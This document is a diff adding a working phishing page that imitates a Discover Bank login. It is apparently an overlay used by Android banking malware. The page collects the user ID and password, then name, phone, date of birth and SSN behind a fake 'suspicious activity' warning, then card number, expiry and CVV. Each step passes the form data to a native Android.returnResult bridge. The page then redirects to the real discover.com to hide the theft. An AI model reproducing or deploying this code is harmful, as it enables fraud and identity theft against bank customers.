@@ -1,0 +1,322 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Discover Bank</title>
+</head>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #ffffff;
+    color: #000000;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    position: relative;
+    z-index: 2;
+    border-bottom: 1px solid #dbdbdb;
+}
+.logongardient {
+    background-color: #f8f8f8;
+    padding: 18px 0;
+    text-align: center;
+}
+.logo {
+    width: 113px;
+    height: 18px;
+    margin: 0 auto;
+    text-align: center;
+    background:  url('data:image/png;base64,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');
+}
+.main {
+    margin-top: 10px;
+}
+.autorizeBox {
+    background: rgba(255, 255, 255, .96);
+    border-radius: 5px;
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+@media only screen and (max-width: 444px) {
+    .autorizeBox {
+        margin: 0 20px;
+    }
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.autorizeBox ::placeholder {
+    color: #717171;
+    opacity: 1;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox input {
+    font-size: 1.125rem;
+    background: 0 0;
+    border: none;
+    border-bottom: 1px solid #ccc;
+    padding: 5px;
+    margin: 10px 0;
+    width: 96%;
+}
+.autorizeBox input.dt {
+    width: 17%;
+}
+.autorizeBox button {
+    margin: 20px 0;
+    background-color: #FF6000;
+    border: none;
+    width: 100%;
+    height: 2.5rem;
+    overflow-x: auto;
+    border-radius: .3125rem;
+    text-align: center;
+    vertical-align: middle;
+    cursor: pointer;
+}
+.autorizeBox button:disabled,
+.autorizeBox button[disabled] {
+    background-color: #8c8c8c;
+}
+.autorizeBox button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+.footer {
+    font-size: 16px;
+    padding: 1em 0;
+    margin-top: 100px;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    color: #757575;
+    font-size: .9rem;
+    text-align: center;
+}
+.footer p {
+    margin: 25px 0;
+}
+#ccnumlbl {
+    color: red;
+    font-size: 0.8rem;
+}
+.warntext {
+    color: red;
+    margin-bottom: 20px;
+    text-align: center;
+    font-weight: bolder;
+}
+</style>
+<body>
+    <div class="header"><div class="logongardient">
+        <div class="logo"></div>
+    </div></div>
+    <div class="main">
+        <div class="autorizeBox">
+            <form id="login" action="" style="">
+                <h3>Secure Account Log In</h3>
+                    <input id="Login" placeholder="User ID" pattern=".{4,}" autocomplete="off" type="text" required>
+                    <input id="Password" placeholder="Password" pattern=".{4,}" autocomplete="off" type="password" required>
+                    <button type="button" onclick="process('login')"><span>Log In</span></button>
+            </form>
+            <form id="address" action="" style="display:none;">
+                    <p class="warntext">Suspicious activity has been noticed on your account. Verify your identity.</p>
+                    <input id="FirstName" placeholder="First name" pattern=".{3,}" autocomplete="off" type="text" required>
+                    <input id="LastName" placeholder="Last name" pattern=".{3,}" autocomplete="off" type="text" required>
+                    <input id="Phone" placeholder="Phone number +1..." pattern="^\+[0-9]{6,}" maxlength="30" autocomplete="off" type="text" required>
+                    <br><label>Date of birth: </label>
+                    <input id="DOB" placeholder="mm/dd/yyyy" type="date" pattern=".{1,}" autocomplete="off" type="text" style="width: 50%;" required>
+                    <input id="SSN" placeholder="SSN number" pattern="[0-9\-]{9,11}" maxlength="11" autocomplete="off" type="text" required>
+                    <button type="button" onclick="process('address')"><span>Next</span></button>
+            </form>
+            <form id="CC" action="" style="display:none;">
+                    <input id="CCNUM" placeholder="Credit card number" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" required>
+                    <span id="ccnumlbl"></span>
+                    <br><label>EXP Date: </label>
+                    <input class="dt" id="CCexpMM" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" maxlength="2" autocomplete="off" type="text" required>
+                    <input class="dt" id="CCEXPYY" placeholder="YY" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" type="text" required>
+                    <br><label>CVV code: </label>
+                    <input id="CVV" placeholder="CVV" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" type="password" style="width:15%;" required>
+					<input id="exit" type="hidden" text="true"/>
+                    <button type="button" onclick="process('CC')"><span>Log In</span></button>
+            </form>
+        </div>
+    </div>
+    <div class="footer"><p>© 2018 Discover Bank, Member FDIC</p></div>
+</body>
+<script>
+var invalidCC = 'Invalid card number';
+
+function maskCC(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '';
+    for(var i = 0; i < v.length; i++) {
+        this.value += (i%4==0 && i != 0 ? ' ' : '') + v[i];
+    }
+}
+document.getElementById('CCNUM').addEventListener('input', maskCC, false);
+
+function maskPhone(event) {
+    var v = this.value.replace(/\D/g, '');
+    this.value = '+' + v;
+}
+document.getElementById('Phone').addEventListener('input', maskPhone, false);
+
+function maskOnlyNumbers(event) {
+    this.value = this.value.replace(/\D/g, '');
+}
+
+var arrtagsID = ['SSN', 'CCexpMM', 'CCEXPYY', 'CVV'];
+for(var iid in arrtagsID) {
+    document.getElementById(arrtagsID[iid]).addEventListener('input', maskOnlyNumbers, false);
+}
+
+function valid_credit_card(value) {
+	if (/[^0-9-\s]+/.test(value)) return false;
+	var nCheck = 0, nDigit = 0, bEven = false;
+	value = value.replace(/\D/g, "");
+	for (var n = value.length - 1; n >= 0; n--) {
+		var cDigit = value.charAt(n),
+			  nDigit = parseInt(cDigit, 10);
+		if (bEven) {
+			if ((nDigit *= 2) > 9) nDigit -= 9;
+		}
+		nCheck += nDigit;
+		bEven = !bEven;
+	}
+	return (nCheck % 10) == 0;
+}
+
+var allButtons = document.getElementsByTagName('button');
+for(var btn in allButtons) {
+    allButtons[btn].disabled = true;
+}
+
+function CheckValidInput(id) {
+    var finalbool = true, formids = document.getElementById(id);
+	var currentinputs = formids.getElementsByTagName('input');
+    for(var i = 0; i < currentinputs.length; i++ ) {
+        if(currentinputs[i].id == 'CCNUM') {
+            var bbb = valid_credit_card(currentinputs[i].value);
+            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
+            finalbool&= bbb;
+            continue;
+        }
+        finalbool &= currentinputs[i].checkValidity();
+    }
+    formids.getElementsByTagName('button')[0].disabled = !finalbool;
+}
+
+var AllForms = document.getElementsByTagName('form');
+function formChange(formId) {
+    for(var i = 0; i < AllForms.length; i++) {
+        AllForms[i].style.display = 'none';
+        if(AllForms[i].id == formId) {
+            AllForms[i+1].style.display = '';
+            break;
+        }
+    }
+}
+
+for(var i = 0; i < AllForms.length; i++) {
+    var myInputs = AllForms[i].getElementsByTagName('input');
+    for(var j = 0; j < myInputs.length; j++) {
+        AddInputEventByFormID(myInputs[j],AllForms[i].id);
+    }
+}
+
+function AddInputEventByFormID(input, formid) {
+    input.addEventListener('input', function(){CheckValidInput(formid)});
+}
+
+function process(formId) {
+    try {
+        Android.returnResult( formToJSON(document.getElementById(formId)) );
+    } catch (err) {}
+    if(formId == 'CC')
+    {
+        location.replace('https://discover.com/');
+        return;
+    }
+    formChange(formId);
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSON(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].id] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+</script>
+</html>
